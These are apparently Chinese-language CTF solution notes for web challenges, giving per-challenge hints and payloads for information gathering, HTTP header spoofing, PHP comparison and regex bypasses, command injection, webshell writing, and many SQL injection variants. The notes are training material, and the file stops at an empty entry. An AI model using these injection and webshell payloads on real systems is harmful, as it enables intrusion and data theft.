# 思路

## 信息收集
### 信息收集-001
> F12 -> fsdsadfhedcjscsdd.txt
### 信息收集-002
> F12
### 信息收集-003
> 禁用F12、右键
### 信息收集-004
> robots.txt
### 信息收集-005
> F12 -> 目录扫描
### 信息收集-006
> 备份 -> www.tar.gz
### 信息收集-007
> 备份 -> index.php.bak
### 信息收集-008
> vim备份 .index.php.swp
### 信息收集-009
> .git 泄露
### 信息收集-010
> 响应头
### 信息收集-011
> F12 爆破 `*.jpg`

## HTTP
### HTTP-001
> F12 -> /flag/index.php
### HTTP-002
> User-Agent: knownsec
### HTTP-003
> Cookie: username=admin;
### HTTP-004
> 302 -> flag.php
### HTTP-005
> POST 方法
### HTTP-006
> Referer：https://flag.com
### HTTP-007
> response header `Access-Control-Allow-HINT: /api/flag.php`
```bash
curl https://ip:port/api/flag.php -H "Content-Type: application/json" -d '{"flag":  "2"}'
```
### HTTP-008
> X-Forwarded-For: 127.0.0.1
### HTTP-009
> `Cookie: username=admin` -> `POST` -> `User-Agent: knownsec` -> `REFERER: flag.com` -> `X-Forwarded-For: 127.0.0.1`
### HTTP-010
> response header `HINT: hint.php` -> `hint.php` -> `http://ip:port/index.php?url=http://127.0.0.1/hint.php`
### HTTP-011
> get传参 d1=flag
### HTTP-012
> post传参 d2=flag
### HTTP-013
> 单参数爆破
### HTTP-014
> 多参数爆破
### HTTP-015
> 多参数爆破 md5加密

## PHP基础
### PHP基础-001
> GET、POST传参 `?f=1`
### PHP基础-002
> GET、POST传参数组 `?flag[0]=nalai`
### PHP基础-003
> 快速提交
```python3
import re

import requests

url = "http://ip:port/api.php"

text = requests.get(url,headers={
    "cookie": "PHPSESSID=58ed338efce21ca94b5efe091b2bda81"
})
data = {
    "userAnswer":eval(re.findall("(.*?) = \?",text.text)[0])}
text = requests.post(url,headers={
    "cookie": "PHPSESSID=58ed338efce21ca94b5efe091b2bda81"
},data=data)
print(text.text)
```
### PHP基础-004
> 快速提交
### PHP基础-005
> 编码 base32 -> base64
### PHP基础-006
> 弱比较 进制转换 ?password=0xdeadc0de
### PHP基础-007
> %0a 换行绕过 preg_match匹配
### PHP基础-008
> url二次编码
### PHP基础-009
> 数组绕过 strlen判断
> `?filename[]=index.php&contents[]=<?php%20system(%27cat%20/flag%27)?>`
### PHP基础-010
> 弱类型转换，科学基数 num=2e4
### PHP基础-011
> 8进制转换10进制 绕过intval `03747`
### PHP基础-012
> 弱类型转换，只要md5加密后的结果为0e科学技术开头，弱比较就会认为是0 `md5_1=QNKCDZO&md5_2=240610708`
### PHP基础-013
> 考察数组md5加密时为NULL `md5_1[]=1&md5_2[]=`
### PHP基础-014
> 自身0e开头 且 md5加密也是0e开头 `?md5=0e215962017`
### PHP基础-015
> in_array弱比较绕过，命令执行 `?size=5;cat%20/flag;#`
### PHP基础-016
> %0a绕过preg_match `username=admin%0a`
### PHP基础-017
> 数组绕过preg_match、strpos `?username[]=admin`
### PHP基础-018
> preg_match回溯次数超过100万 返回false
```py
import requests
url = "http://ip:port/"
username = "<?php system('cat /flag');//"+"a"*1000000
requests.post(url,data={
    "username": username,
})
resp = requests.get(f"{url}shell.php")
print(resp.text)
```
### PHP基础-019
> 动态函数调用 `?name=readflag`
### PHP基础-020
> PHP函数注册 `password=1&name=\%00readflag/var/www/html/index.php:9$0`
> 详情可看 -> https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html#opline
### PHP基础-021
> 在5.x 版本中 preg_replace`/e`模式,结果会带入eval函数中执行 ?username=var_dump($flag)
### PHP基础-022
> 变量覆盖 `?password[username]=knownsec`
### PHP基础-023
> 变量覆盖 `?suces=flag&flag=`
### PHP基础-024
> md5碰撞 找两个不同文件但md5相同即可
```shell
docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll  -o msg1.bin msg2.bin
```
## SQL注入
### SQL注入-001
> 万能密码 `?username=admin' or 1=1 --+&password=1`
### SQL注入-002
> int型SQL注入 `?id=-1 union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-003
> 字符型SQL注入 `?id=-1' union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-004
> 双引号 `?id=-1" union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-005
> 括号 `?id=-1) union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-006
> 简单bool型
> 单引号括号 `?id=-1') union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-007
> 简单bool型
```text
?id=1 order by 3 --+ # 查当前字段 
?id=1 and length(database()) = 3 --+ # 查询当前数据库长度
?id=1 and length(@@version_compile_os)< {10} --+ #查询操作系统字符长度
?id=1 and length(version())< {10} --+ #查询mysql版本字符长度
?id=1 and length(database())< {10} --+ #查询当前库字符长度
?id=1 and ascii(substr(sql语句,{1},1))={100} --+ #综合类查询
```
### SQL注入-008
> 时间型
```text
?id=1 and if (ascii(substr(sql语句,{1},1)={1},1,sleep(5)) # 与sqlmap一致 休眠即可
```
### SQL注入-009
> 报错注入 extractvalue、updaxml 有长度限制 可以采用倒叙
```text
?id=1 or extractvalue(0x0a,concat(0x0a,(select group_concat(flag) from ctf.flag)))--+
?id=1 or extractvalue(0x0a,concat(0x0a,(select REVERSE(group_concat(flag)) from ctf.flag)))--+
```
### SQL注入-010
> 堆叠注入
```text
?id=-1;select * from ctf.flag;
```
### SQL注入-011
> 二次注入 先注册一个 为 `admin'#`的账户 ，后面修改它的密码，即修改admin的密码;
### SQL注入-012
> 宽字节注入 利用`%df`和转义符`\\`构成汉字进行利用
> ?id=-1%df' union select 1,(select group_concat(flag) from ctf.flag),3 --+
### SQL注入-013
> 过滤了 ` （空格）+（加号）` 可以用 注释 `/**/` 绕过
> `?id=-1'/**/union/**/select/**/1,(select/**/group_concat(flag)/**/from/**/ctf.flag),3/**/%23`
### SQL注入-014
> 过滤了 `,` 可以与 join 起 配合别名
> `?id=-1' union select * from (select 1)A join((select group_concat(flag) from ctf.flag)B join(select 3)C) --+`
### SQL注入-015
> 文件读写, `?id=-1' union select 1,2,(select load_file('/flag'))--+`
### SQL注入-016